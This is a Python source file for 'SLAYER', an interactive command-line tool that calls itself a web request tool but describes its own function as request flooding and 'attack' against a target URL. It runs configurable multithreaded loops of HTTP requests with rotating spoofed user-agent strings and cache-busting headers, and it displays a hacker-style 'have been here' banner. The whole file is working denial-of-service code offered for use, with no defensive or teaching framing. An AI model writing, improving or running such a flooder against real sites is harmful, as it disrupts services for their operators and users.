#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SLAYER - Web Request Tool
"""

import os
import sys
import time
import random
import threading
import requests
from datetime import datetime
import json

class Color:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

class Slayer:
    def __init__(self):
        self.target_url = ""
        self.method = "GET"
        self.delay = 1
        self.threads = 1
        self.running = False
        self.requests_count = 0
        self.success_count = 0
        self.error_count = 0
        self.start_time = None
        self.session = self._create_session()
        
    def _create_session(self):
        """Create HTTP session"""
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': '*/*',
            'Cache-Control': 'no-cache'
        })
        return session

    def display_banner(self):
        """Display the Slayer banner"""
        os.system('clear' if os.name == 'posix' else 'cls')
        
        banner = f"""
{Color.RED}{Color.BOLD}
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║  ███████╗██╗      █████╗ ██╗   ██╗███████╗██████╗ ███████╗                  ║
║  ██╔════╝██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗██╔════╝                  ║
║  ███████╗██║     ███████║ ╚████╔╝ █████╗  ██████╔╝███████╗                  ║
║  ╚════██║██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗╚════██║                  ║
║  ███████║███████╗██║  ██║   ██║   ███████╗██║  ██║███████║                  ║
║  ╚══════╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝                  ║
║                                                                              ║
║  ╔════════════════════════════════════════════════════════════════════════╗  ║
║  ║ {Color.CYAN}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓{Color.RED} ║  ║
║  ║ {Color.CYAN}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓{Color.RED} ║  ║
║  ║ {Color.WHITE}    ███████╗██╗      █████╗ ██╗   ██╗███████╗██████╗                 {Color.RED} ║  ║
║  ║ {Color.WHITE}    ██╔════╝██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗                {Color.RED} ║  ║
║  ║ {Color.WHITE}    ███████╗██║     ███████║ ╚████╔╝ █████╗  ██████╔╝                {Color.RED} ║  ║
║  ║ {Color.WHITE}    ╚════██║██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗                {Color.RED} ║  ║
║  ║ {Color.WHITE}    ███████║███████╗██║  ██║   ██║   ███████╗██║  ██║                {Color.RED} ║  ║
║  ║ {Color.WHITE}    ╚══════╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝                {Color.RED} ║  ║
║  ║                                                                              ║  ║
║  ║ {Color.YELLOW}               S L A Y E R   H A V E   B E E N   H E R E               {Color.RED} ║  ║
║  ║                                                                              ║  ║
║  ║ {Color.CYAN}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓{Color.RED} ║  ║
║  ║ {Color.CYAN}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓{Color.RED} ║  ║
║  ╚════════════════════════════════════════════════════════════════════════╝  ║
║                                                                              ║
║                         {Color.GREEN}Ultimate Web Request Tool v2.0{Color.RED}                       ║
╚══════════════════════════════════════════════════════════════════════════════╝
{Color.END}
        """
        print(banner)

    def display_status(self):
        """Display current configuration status"""
        status = f"""
{Color.CYAN}{Color.BOLD}[ CURRENT CONFIG ]{Color.END}
{Color.YELLOW}Target URL:{Color.END} {self.target_url or 'Not set'}
{Color.YELLOW}HTTP Method:{Color.END} {self.method}
{Color.YELLOW}Delay:{Color.END} {self.delay} seconds
{Color.YELLOW}Threads:{Color.END} {self.threads}
{Color.YELLOW}Status:{Color.END} {Color.GREEN if self.running else Color.RED}{'ACTIVE' if self.running else 'INACTIVE'}{Color.END}
"""
        if self.running:
            elapsed = time.time() - self.start_time
            status += f"""
{Color.CYAN}{Color.BOLD}[ REAL-TIME STATS ]{Color.END}
{Color.YELLOW}Requests:{Color.END} {self.requests_count}
{Color.YELLOW}Success:{Color.END} {Color.GREEN}{self.success_count}{Color.END}
{Color.YELLOW}Errors:{Color.END} {Color.RED}{self.error_count}{Color.END}
{Color.YELLOW}Uptime:{Color.END} {elapsed:.1f} seconds
{Color.YELLOW}Requests/sec:{Color.END} {self.requests_count/elapsed if elapsed > 0 else 0:.2f}
"""
        print(status)

    def _get_random_user_agent(self):
        """Get random user agent"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36'
        ]
        return random.choice(user_agents)

    def make_request(self, thread_id=0):
        """Make HTTP request to target"""
        while self.running:
            try:
                start_time = time.time()
                
                headers = {
                    'User-Agent': self._get_random_user_agent(),
                    'Accept': '*/*',
                    'Cache-Control': 'no-cache'
                }
                
                if self.method.upper() == 'GET':
                    response = self.session.get(self.target_url, timeout=10, headers=headers)
                elif self.method.upper() == 'POST':
                    response = self.session.post(self.target_url, timeout=10, headers=headers)
                elif self.method.upper() == 'PUT':
                    response = self.session.put(self.target_url, timeout=10, headers=headers)
                elif self.method.upper() == 'DELETE':
                    response = self.session.delete(self.target_url, timeout=10, headers=headers)
                elif self.method.upper() == 'HEAD':
                    response = self.session.head(self.target_url, timeout=10, headers=headers)
                else:
                    response = self.session.request(self.method, self.target_url, timeout=10, headers=headers)
                
                elapsed = (time.time() - start_time) * 1000
                
                self.requests_count += 1
                
                if 200 <= response.status_code < 300:
                    self.success_count += 1
                    status_color = Color.GREEN
                    status_text = "SUCCESS"
                else:
                    self.error_count += 1
                    status_color = Color.YELLOW
                    status_text = "WARNING"
                
                # Show real-time result
                print(f"{Color.WHITE}[{datetime.now().strftime('%H:%M:%S')}] {status_color}[{status_text}] {Color.CYAN}Thread-{thread_id} {Color.WHITE}| {Color.MAGENTA}Status: {response.status_code} {Color.WHITE}| {Color.BLUE}Time: {elapsed:.0f}ms {Color.WHITE}| {Color.YELLOW}Size: {len(response.content)} bytes{Color.END}")
                
            except Exception as e:
                self.error_count += 1
                self.requests_count += 1
                print(f"{Color.WHITE}[{datetime.now().strftime('%H:%M:%S')}] {Color.RED}[ERROR] {Color.CYAN}Thread-{thread_id} {Color.WHITE}| {Color.RED}Error: {str(e)[:50]}{Color.END}")
            
            time.sleep(self.delay)

    def start_attack(self):
        """Start the request flooding"""
        if not self.target_url:
            print(f"{Color.RED}[!] Error: Target URL not set{Color.END}")
            return
        
        if not self.target_url.startswith(('http://', 'https://')):
            self.target_url = 'http://' + self.target_url
        
        print(f"\n{Color.GREEN}[+] Starting attack against: {self.target_url}{Color.END}")
        print(f"{Color.YELLOW}[+] Method: {self.method} | Delay: {self.delay}s | Threads: {self.threads}{Color.END}")
        print(f"{Color.RED}[!] Press Ctrl+C to stop the attack{Color.END}\n")
        
        self.running = True
        self.start_time = time.time()
        self.requests_count = 0
        self.success_count = 0
        self.error_count = 0
        
        # Create threads
        thread_pool = []
        for i in range(self.threads):
            thread = threading.Thread(target=self.make_request, args=(i+1,))
            thread.daemon = True
            thread_pool.append(thread)
            thread.start()
        
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop_attack()
        
        # Wait for all threads to finish
        for thread in thread_pool:
            thread.join(timeout=1)

    def stop_attack(self):
        """Stop the attack"""
        self.running = False
        print(f"\n{Color.RED}[!] Attack stopped{Color.END}")
        self.display_final_stats()

    def display_final_stats(self):
        """Display final statistics"""
        if self.start_time:
            elapsed = time.time() - self.start_time
            print(f"\n{Color.CYAN}{Color.BOLD}[ FINAL STATISTICS ]{Color.END}")
            print(f"{Color.YELLOW}Total duration:{Color.END} {elapsed:.2f} seconds")
            print(f"{Color.YELLOW}Total requests:{Color.END} {self.requests_count}")
            print(f"{Color.YELLOW}Successful requests:{Color.END} {Color.GREEN}{self.success_count}{Color.END}")
            print(f"{Color.YELLOW}Failed requests:{Color.END} {Color.RED}{self.error_count}{Color.END}")
            success_rate = (self.success_count/self.requests_count*100) if self.requests_count > 0 else 0
            print(f"{Color.YELLOW}Success rate:{Color.END} {success_rate:.1f}%")
            print(f"{Color.YELLOW}Requests/second:{Color.END} {self.requests_count/elapsed if elapsed > 0 else 0:.2f}")

    def show_help(self):
        """Display help menu"""
        help_text = f"""
{Color.CYAN}{Color.BOLD}[ AVAILABLE COMMANDS ]{Color.END}

{Color.GREEN}Basic commands:{Color.END}
  {Color.YELLOW}set target {Color.WHITE}<url>{Color.END}      - Set target URL
  {Color.YELLOW}set method {Color.WHITE}<method>{Color.END}    - Set HTTP method (GET, POST, etc.)
  {Color.YELLOW}set delay {Color.WHITE}<seconds>{Color.END}    - Set delay between requests
  {Color.YELLOW}set threads {Color.WHITE}<number>{Color.END}   - Set number of threads
  {Color.YELLOW}run{Color.END}                    - Start attack
  {Color.YELLOW}stop{Color.END}                   - Stop attack
  {Color.YELLOW}status{Color.END}                 - Show current status
  {Color.YELLOW}help{Color.END}                   - Show this help
  {Color.YELLOW}clear{Color.END}                  - Clear screen
  {Color.YELLOW}exit{Color.END}                   - Exit program

{Color.GREEN}Examples:{Color.END}
  {Color.WHITE}set target https://example.com/api{Color.END}
  {Color.WHITE}set method POST{Color.END}
  {Color.WHITE}set delay 0.5{Color.END}
  {Color.WHITE}set threads 5{Color.END}
  {Color.WHITE}run{Color.END}
"""
        print(help_text)

    def handle_set_command(self, command):
        """Handle set commands"""
        parts = command.split()
        if len(parts) < 2:
            print(f"{Color.RED}[!] Usage: set <option> <value>{Color.END}")
            return
            
        option = parts[0]
        value = ' '.join(parts[1:])
        
        if option == 'target':
            self.target_url = value
            print(f"{Color.GREEN}[+] Target set: {value}{Color.END}")
            
        elif option == 'method':
            valid_methods = ['GET', 'POST', 'PUT', 'DELETE', 'HEAD', 'OPTIONS', 'PATCH']
            if value.upper() in valid_methods:
                self.method = value.upper()
                print(f"{Color.GREEN}[+] Method set: {value.upper()}{Color.END}")
            else:
                print(f"{Color.RED}[!] Invalid method. Options: {', '.join(valid_methods)}{Color.END}")
                
        elif option == 'delay':
            try:
                self.delay = float(value)
                if self.delay < 0:
                    raise ValueError("Delay cannot be negative")
                print(f"{Color.GREEN}[+] Delay set: {value} seconds{Color.END}")
            except ValueError:
                print(f"{Color.RED}[!] Delay must be a valid number{Color.END}")
                
        elif option == 'threads':
            try:
                self.threads = int(value)
                if self.threads < 1:
                    raise ValueError("Must have at least 1 thread")
                if self.threads > 50:
                    print(f"{Color.YELLOW}[!] Warning: Many threads may affect performance{Color.END}")
                print(f"{Color.GREEN}[+] Threads set: {value}{Color.END}")
            except ValueError:
                print(f"{Color.RED}[!] Threads must be a valid integer{Color.END}")
                
        else:
            print(f"{Color.RED}[!] Unknown option: {option}{Color.END}")
            print(f"{Color.YELLOW}[!] Valid options: target, method, delay, threads{Color.END}")

    def run(self):
        """Main program loop"""
        self.display_banner()
        self.show_help()
        
        while True:
            try:
                cmd = input(f"\n{Color.RED}slayer{Color.END}>{Color.WHITE} ").strip().lower()
                
                if cmd == 'exit' or cmd == 'quit':
                    if self.running:
                        self.stop_attack()
                    print(f"{Color.CYAN}[+] Exiting... See you next time!{Color.END}")
                    break
                    
                elif cmd == 'help':
                    self.show_help()
                    
                elif cmd == 'clear':
                    self.display_banner()
                    
                elif cmd == 'status':
                    self.display_status()
                    
                elif cmd == 'run':
                    if self.running:
                        print(f"{Color.YELLOW}[!] Attack is already running{Color.END}")
                    else:
                        self.start_attack()
                        
                elif cmd == 'stop':
                    if self.running:
                        self.stop_attack()
                    else:
                        print(f"{Color.YELLOW}[!] No attack is running{Color.END}")
                        
                elif cmd.startswith('set '):
                    self.handle_set_command(cmd[4:])
                    
                elif cmd:
                    print(f"{Color.RED}[!] Unknown command: {cmd}{Color.END}")
                    print(f"{Color.YELLOW}[!] Type 'help' to see available commands{Color.END}")
                    
            except KeyboardInterrupt:
                print(f"\n{Color.RED}[!] Command interrupted{Color.END}")
            except Exception as e:
                print(f"{Color.RED}[!] Error: {str(e)}{Color.END}")

def main():
    """Main entry point"""
    try:
        slayer = Slayer()
        slayer.run()
    except KeyboardInterrupt:
        print(f"\n{Color.CYAN}[+] Program terminated by user{Color.END}")
    except Exception as e:
        print(f"{Color.RED}[!] Critical error: {str(e)}{Color.END}")
        sys.exit(1)

if __name__ == "__main__":
    main()